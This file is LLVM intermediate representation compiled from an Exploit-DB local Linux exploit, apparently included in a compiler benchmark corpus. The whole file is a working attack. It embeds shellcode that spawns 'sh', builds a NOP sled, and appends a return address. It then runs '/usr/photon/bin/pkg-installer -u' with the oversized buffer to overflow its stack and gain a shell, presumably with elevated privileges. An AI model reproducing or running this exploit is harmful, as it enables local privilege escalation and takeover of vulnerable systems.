; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_21506.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_21506.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@__const.main.s = private unnamed_addr constant [24 x i8] c"\EB\0E1\C0[\88C\02S\BB\E4\B4\04\08\FF\D3\E8\ED\FF\FF\FFsh\00", align 16
@.str = private unnamed_addr constant [14 x i8] c"using ret %x\0A\00", align 1
@.str.1 = private unnamed_addr constant [5 x i8] c"%s%s\00", align 1
@.str.2 = private unnamed_addr constant [30 x i8] c"/usr/photon/bin/pkg-installer\00", align 1
@.str.3 = private unnamed_addr constant [14 x i8] c"pkg-installer\00", align 1
@.str.4 = private unnamed_addr constant [3 x i8] c"-u\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca [24 x i8], align 16
  %9 = alloca [2000 x i8], align 16
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 134510701, i32* %6, align 4
  %10 = bitcast [24 x i8]* %8 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %10, i8* align 16 getelementptr inbounds ([24 x i8], [24 x i8]* @__const.main.s, i32 0, i32 0), i64 24, i1 false)
  %11 = load i32, i32* %4, align 4
  %12 = icmp sge i32 %11, 2
  br i1 %12, label %13, label %20

13:                                               ; preds = %2
  %14 = load i32, i32* %6, align 4
  %15 = load i8**, i8*** %5, align 8
  %16 = getelementptr inbounds i8*, i8** %15, i64 1
  %17 = load i8*, i8** %16, align 8
  %18 = call i32 @atoi(i8* %17)
  %19 = sub nsw i32 %14, %18
  store i32 %19, i32* %6, align 4
  br label %20

20:                                               ; preds = %13, %2
  %21 = bitcast i32* %6 to i8*
  store i8* %21, i8** %7, align 8
  %22 = load i32, i32* %6, align 4
  %23 = call i32 @printf(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str, i64 0, i64 0), i32 %22)
  %24 = getelementptr inbounds [2000 x i8], [2000 x i8]* %9, i64 0, i64 0
  %25 = call i32 @memset(i8* %24, i32 144, i32 1254)
  %26 = getelementptr inbounds [2000 x i8], [2000 x i8]* %9, i64 0, i64 0
  %27 = getelementptr inbounds i8, i8* %26, i64 1254
  %28 = getelementptr inbounds [24 x i8], [24 x i8]* %8, i64 0, i64 0
  %29 = load i8*, i8** %7, align 8
  %30 = call i32 @sprintf(i8* %27, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.1, i64 0, i64 0), i8* %28, i8* %29)
  %31 = getelementptr inbounds [2000 x i8], [2000 x i8]* %9, i64 0, i64 0
  %32 = call i32 @execlp(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.2, i64 0, i64 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.3, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.4, i64 0, i64 0), i8* %31, i32 0)
  %33 = load i32, i32* %3, align 4
  ret i32 %33
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #1

declare dso_local i32 @atoi(i8*) #2

declare dso_local i32 @printf(i8*, i32) #2

declare dso_local i32 @memset(i8*, i32, i32) #2

declare dso_local i32 @sprintf(i8*, i8*, i8*, i8*) #2

declare dso_local i32 @execlp(i8*, i8*, i8*, i8*, i32) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
